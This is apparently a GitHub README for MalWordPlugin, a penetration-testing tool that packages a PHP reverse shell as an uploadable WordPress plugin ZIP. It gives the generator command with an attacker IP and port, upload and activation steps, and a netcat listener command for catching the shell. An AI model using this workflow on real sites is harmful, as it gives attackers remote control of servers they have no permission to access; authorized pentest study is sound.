# MalWordPlugin

MalWordPlugin is a proof-of-concept (PoC) tool that generates a malicious WordPress plugin packaged as a ZIP file. This plugin can be used for penetration testing, demonstrating potential security vulnerabilities in WordPress environments.

The project is inspired by the malicious-wordpress-plugin repository by wetw0rk and incorporates a PHP reverse shell from PentestMonkey. Additionally, insights gained from a cybersecurity certification were applied to extend and modify the original concept.

## Features

* Plugin Generator: Automatically creates a ZIP file containing a custom malicious WordPress plugin.
* Customizable Payload: Modify the plugin’s behavior and payload to suit different penetration testing scenarios. I used the PHP Reverseshell from PentestMonkey as example.
* Ready-to-Deploy: The generated ZIP file can be directly uploaded and activated in a WordPress installation.

## Installation
### Prerequisites

* Python 3.12.*
* Basic understanding of WordPress plugins and their deployment

### Steps

1. Clone the repository:

```bash
git clone https://github.com/username/malwordplugin.git
cd malwordplugin
```

2. Run the tool to generate the ZIP file:

```bash
python3 malwordplugin.py -d 192.168.1.1 -p 4242 
```

3. The ZIP file will be created in the project directory (e.g., malicious.zip).

## Usage

1. Upload the generated ZIP file to a WordPress installation via the admin panel (Plugins > Add New > Upload Plugin).
2. Activate the plugin.
3. Start a listener on your attack machine (e.g., using netcat):
```bash
nc -lvnp <port>
```
4. Trigger the plugin to initiate the reverse shell connection. (The generator tells you the url templates)

## Technologies Used

* Python: Core logic for generating the WordPress plugin.
* PHP: Payload execution, including reverse shell functionality.
* WordPress: Target platform for plugin deployment.

## Disclaimer

This project is intended for educational purposes only. Use it responsibly and only on systems you own or have explicit permission to test. Unauthorized use of this tool may be illegal.

## License

MIT License
